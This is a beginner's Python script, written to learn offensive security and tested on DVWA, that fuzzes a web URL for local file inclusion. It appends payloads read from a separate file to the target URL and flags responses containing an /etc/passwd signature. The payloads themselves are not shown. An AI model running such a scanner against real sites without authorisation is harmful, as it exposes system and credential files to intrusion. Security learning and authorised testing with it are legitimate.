#!/usr/bin/env python3

import requests

# Created by s3v3n @ https://s3v3n.io
# I made this as a project to learn python while i learn offensive security.
# I tested this on DVWA, currently trying to learn how to improve this script.
# Payloads are fed into the URL as potential LFI exploit attempts. Fuzzing the web app in hopes that our inputs(payloads) cause any unintended behavior, like exposing sensitive filels.
 
# This script requires a payloads.txt file in the same directory as this script



# Define function load_payloads to read, handle, and strip any unwanted whitespace.
def load_payloads(file_name="payloads.txt"):
    try:
        # call the fiename stored in variabe file_name and read it as a file.
        with open(file_name, "r") as file:                        
            # Iterating each line of file_name="file.txt" with "file.readlines()", whitespace from each line with "line.strip()",
            # use "return[]" to turn data into a list, use "if line.strip()" returns filtered list of non-empty lines only.  
            return [line.strip() for line in file.readlines() if line.strip()]
    # error exception handling, print to output "Error:" if payloads.txt
    # is named wrong, or not in the same directory as LFI_scanner.py.
    except FileNotFoundError:
        print(f"Error: {file_name} not found. Please ensure the file is in the same directory.")
        return []

# Takes user input of the target URL and adds the target URL to base_url variable. Be sure to put '/' at the end of the url if required e.g. https://website.com/
base_url = input("Enter the URL to test (e.g., http://example.com/vulnerable.php?page=): ")

# Function to test each payload and iterate down the lines of payload.txt until there are no more payloads.
def scan_lfi(payloads):
    for payload in payloads:
        # this takes the user's target url input variabe 'base_url then adds 
        target_url = base_url + payload
        print(f"Testing: {target_url}")
        
        try:
            response = requests.get(target_url)
            # Check for typical LFI indicators (presence of /etc/passwd)
            if "root:x" in response.text:
                print(f"[+] Vulnerable to LFI: {target_url}")
            else:
                print(f"[-] No LFI detected: {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Load payloads from payloads.txt and start the scan
lfi_payloads = load_payloads("payloads.txt")
if lfi_payloads:
    scan_lfi(lfi_payloads)